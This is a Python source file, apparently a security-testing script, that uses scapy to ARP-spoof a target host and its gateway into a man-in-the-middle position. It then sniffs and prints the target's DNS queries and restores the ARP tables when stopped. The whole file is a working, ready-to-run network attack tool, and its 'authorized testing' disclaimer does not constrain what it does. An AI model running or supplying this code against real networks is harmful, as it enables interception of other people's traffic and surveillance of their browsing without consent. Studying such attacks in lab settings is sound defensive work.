"""
Controlled MITM (Man-in-the-Middle) Security Testing and DNS Traffic Analysis

This script demonstrates ARP-based MITM positioning and DNS query
observation in an authorized local network test environment.

For educational and security research purposes only.
"""

from scapy.all import ARP, Ether, sendp, AsyncSniffer, conf, IP, DNS
import time
import threading
import json

# ======================= CONFIGURATION ========================
# Load environment-specific settings from the local, Git-ignored configuration.
try:
    with open("config/config.local.json", "r") as config_file:
        config = json.load(config_file)
except FileNotFoundError:
    print("[!] Missing config/config.local.json")
    print("[!] Copy config/config.example.json to config/config.local.json")
    print("[!] Then update it with your authorized test environment settings.")
    raise SystemExit(1)
except json.JSONDecodeError:
    print("[!] Invalid JSON in config/config.local.json")
    raise SystemExit(1)

interface_index = config["interface_index"]
wifi_iface = conf.ifaces.dev_from_index(interface_index)

target_ip = config["target_ip"]
gateway_ip = config["gateway_ip"]
target_mac = config["target_mac"]
gateway_mac = config["gateway_mac"]
excluded_ip = config["excluded_ip"]

# ======================= ARP SPOOFING =========================
def spoof(target_ip, spoof_ip, target_mac):
    """Send an ARP reply used for controlled MITM positioning."""
    packet = Ether(dst=target_mac) / ARP(
        op=2,
        pdst=target_ip,
        psrc=spoof_ip,
        hwdst=target_mac
    )
    sendp(packet, verbose=False)

def restore(dest_ip, src_ip, dest_mac, src_mac):
    """Restore the legitimate ARP mapping after controlled testing."""
    packet = Ether(dst=dest_mac) / ARP(
        op=2,
        pdst=dest_ip,
        psrc=src_ip,
        hwdst=dest_mac,
        hwsrc=src_mac
    )
    sendp(packet, count=4, verbose=False)
    print(f"[+] Restored ARP table of {dest_ip}")

# ======================= DNS SNIFFER ==========================
seen_queries = {}
DEDUP_SECONDS=10

def dns_sniffer(packet):
    """Observe and display DNS query domains from captured packets."""
    try:
        if packet.haslayer(IP) and packet.haslayer(DNS):
            if packet[DNS].qr == 0 and packet[DNS].qd:
                src_ip = packet[IP].src
                if src_ip == excluded_ip:
                    return
                domain = packet[DNS].qd.qname.decode("utf-8", errors="ignore").rstrip(".")
                key = (src_ip, domain)
                now = time.time()
                if key in seen_queries and now - seen_queries[key] < DEDUP_SECONDS:
                    return
                seen_queries[key] = now
                print(f"[DNS] {src_ip} queried {domain}")
    except Exception as e:
        print(f"[DNS ERROR] {e}")

# ======================= LOOP CONTROL =========================
stop_event = threading.Event()

def arp_spoof_loop():
    """Maintain ARP-based MITM positioning during the authorized test."""
    try:
        while not stop_event.is_set():
            spoof(target_ip, gateway_ip, target_mac)
            spoof(gateway_ip, target_ip, gateway_mac)
            time.sleep(0.5)
    except Exception as e:
        print(f"[!] Error in ARP loop: {e}")
    finally:
        restore(target_ip, gateway_ip, target_mac, gateway_mac)
        restore(gateway_ip, target_ip, gateway_mac, target_mac)
        print("[*] ARP tables restored. Exiting...")

# ======================= MAIN ================================
if __name__ == "__main__":
    try:
        print("[*] Starting ARP spoofing and DNS sniffing...")

        arp_thread = threading.Thread(target=arp_spoof_loop)
        arp_thread.start()

        sniffer = AsyncSniffer(
            iface=wifi_iface,
            filter="port 53",
            prn=dns_sniffer,
            store=False
        )
        sniffer.start()

        while True:
            time.sleep(1)

    except KeyboardInterrupt:
        print("\n[!] Detected CTRL+C — Stopping MITM attack...")
        stop_event.set()
        sniffer.stop()
        arp_thread.join()